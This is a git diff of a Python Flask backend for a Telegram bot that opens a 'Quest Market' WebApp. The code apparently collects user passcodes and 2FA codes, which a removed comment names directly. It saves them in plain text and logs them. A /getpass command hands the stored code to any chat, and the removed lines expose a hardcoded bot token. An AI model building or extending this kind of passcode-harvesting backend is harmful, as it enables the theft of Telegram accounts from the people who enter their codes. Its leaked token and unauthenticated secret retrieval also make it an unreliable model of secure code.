@@ -1,121 +1,113 @@
 import os
-import telebot
-from flask import Flask, Blueprint, request, jsonify
 import json
+import requests
+from flask import Flask, request, jsonify, send_from_directory
 from telebot import types
 
-TOKEN = "8506299686:AAEXWBNmuRrVIIKiwXtRKwJrG8AaXdSwH64"
-WEBAPP_URL = "https://fairusss.github.io/tgbot/"
+# === Configuration ===
+BOT_TOKEN = os.environ.get("BOT_TOKEN") or "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+WEBAPP_URL = "https://fairusss.github.io/tgbot/"  # your hosted front-end
 
-app = Flask(__name__)
+# === Flask Setup ===
+app = Flask(__name__, static_folder="assets", template_folder="template")
 
-path_cwd = os.path.dirname(os.path.realpath(__file__))
-path_templates = os.path.join(path_cwd,"templates")
-path_static = os.path.join(path_cwd,"static")
+# === Telegram Webhook ===
+@app.route("/webhook", methods=["POST"])
+def webhook():
+    update = request.get_json(force=True, silent=True)
+    print("🔹 Telegram update:", json.dumps(update, indent=2, ensure_ascii=False), flush=True)
 
-Func = Blueprint('func', __name__, static_folder=path_static, template_folder=path_templates)
-@Func.route('/func', methods=['GET','POST'])
-def func():
-    dataGet = '' if not request.get_json(force=True) else request.get_json(force=True)
-    print(dataGet)
-    dataReply = {'backend_data':'some_data'}
-    print(dataReply)
-    return jsonify(dataReply)
+    if not update or "message" not in update:
+        return jsonify({"ok": True})
 
-@app.route('/')
-def index():
-    return "WebApp працює!"
+    message = update["message"]
+    chat_id = message["chat"]["id"]
+    text = message.get("text", "")
 
-@app.route('/api/data', methods=['GET','POST'])
-def receive_data():
-    data = request.get_json()
-    passcode = data.get("passcode")
+    # /start command
+    if text == "/start":
+        keyboard = {
+            "inline_keyboard": [[{
+                "text": "🌐 Відкрити WebApp",
+                "web_app": {"url": WEBAPP_URL}
+            }]]
+        }
 
-    if not passcode:
-        return jsonify({"error": "no passcode"}), 400
+        requests.post(f"{TELEGRAM_API}/sendMessage", json={
+            "chat_id": chat_id,
+            "text": "Привіт! Натисни, щоб відкрити Quest Market:",
+            "reply_markup": keyboard
+        })
 
-    # Save passcode to temp file
-    with open("temp_passcode.txt", "w") as f:
-        f.write(passcode)
+    elif text == "/getpass":
+        try:
+            with open("temp_passcode.txt", "r") as f:
+                saved = f.read()
+            msg = f"📄 Збережений код: {saved}"
+        except FileNotFoundError:
+            msg = "❌ Немає збереженого коду."
+        requests.post(f"{TELEGRAM_API}/sendMessage", json={
+            "chat_id": chat_id,
+            "text": msg
+        })
 
-    print(f"[SERVER] Passcode received and saved: {passcode}")
-
-    # Read back (just to verify)
-    with open("temp_passcode.txt", "r") as f:
-        saved = f.read()
-        print(f"[SERVER] File contents: {saved}")
-
-    return jsonify({"status": "ok", "saved": saved})
+    return jsonify({"ok": True})
 
 
-bot = telebot.TeleBot(TOKEN)
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    markup = types.InlineKeyboardMarkup()
-    markup.add(
-        types.InlineKeyboardButton(
-            text="Відкрити WebApp",
-            web_app=types.WebAppInfo(url=WEBAPP_URL)
-        )
-    )
-    bot.send_message(
-        message.chat.id,
-        "Привіт! Натисни, щоб відкрити Quest Market:",
-        reply_markup=markup
-    )
-
-# Получаем данные с WebApp
-@bot.message_handler(content_types=['web_app_data'])
-def handle_webapp_data(message):
-    try:
-        data = message.web_app_data
-        print(f"Received data from WebApp: {data}")
-
-        # Отправляем полученные данные в Telegram
-        bot.send_message(message.chat.id, f"Отримано дані: {data}")
-
-        # Если нужно, можно сохранить данные на сервере
-        with open("received_data.txt", "w") as f:
-            json.dump(data, f)
-        
-    except Exception as e:
-        print(f"Error processing WebApp data: {e}")
-        bot.send_message(message.chat.id, "Не вдалося обробити дані.")
-
-# 🟢 AJAX endpoint — WebApp sends passcode / 2FA here
+# === WebApp backend endpoint for AJAX data ===
 @app.route("/submit_data", methods=["POST"])
 def submit_data():
-    try:
-        data = request.get_json()
-        action = data.get("action")
-        value = data.get("value")
-        user_id = data.get("user_id")
+    data = request.get_json()
+    print("📨 Received from WebApp:", data, flush=True)
 
-        print(f"Received from WebApp: {action} = {value}")
+    user_id = data.get("user_id")
+    action = data.get("action")
+    value = data.get("value")
 
-        # Optionally send confirmation message to Telegram chat
-        if user_id:
-            bot.send_message(user_id, f"✅ Got {action}: {value}")
+    if not user_id:
+        return jsonify({"ok": False, "error": "Missing user_id"}), 400
 
-        return jsonify(success=True, message="Data received"), 200
-    except Exception as e:
-        print("Error:", e)
-        return jsonify(success=False, message=str(e)), 400
+    # Example: store passcode
+    if action == "passcode":
+        with open("temp_passcode.txt", "w") as f:
+            f.write(value or "")
+        print(f"[SERVER] Saved passcode: {value}")
 
-@bot.message_handler(commands=['getpass'])
-def get_pass(message):
-    try:
-        with open("temp_passcode.txt", "r") as f:
-            saved = f.read()
-        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
-    except FileNotFoundError:
-        bot.send_message(message.chat.id, "❌ No passcode saved yet.")
+    # Notify user in Telegram
+    requests.post(f"{TELEGRAM_API}/sendMessage", json={
+        "chat_id": user_id,
+        "text": f"✅ Отримано {action}: {value}"
+    })
 
-print("Бот запущено! Очікуємо дані...")
+    return jsonify({"ok": True})
 
-bot.infinity_polling()  
 
-if __name__ == "main":
-    port = 12345
+# === Static and Template File Serving ===
+@app.route("/assets/<path:filename>")
+def serve_assets(filename):
+    return send_from_directory("assets", filename)
+
+@app.route("/scripts/<path:filename>")
+def serve_scripts(filename):
+    return send_from_directory("scripts", filename)
+
+@app.route("/styles/<path:filename>")
+def serve_styles(filename):
+    return send_from_directory("styles", filename)
+
+@app.route("/template/<path:filename>")
+def serve_templates(filename):
+    return send_from_directory("template", filename)
+
+
+# === Health Check ===
+@app.route("/")
+def index():
+    return "✅ Telegram bot and WebApp backend running fine."
+
+
+# === Main Entrypoint ===
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
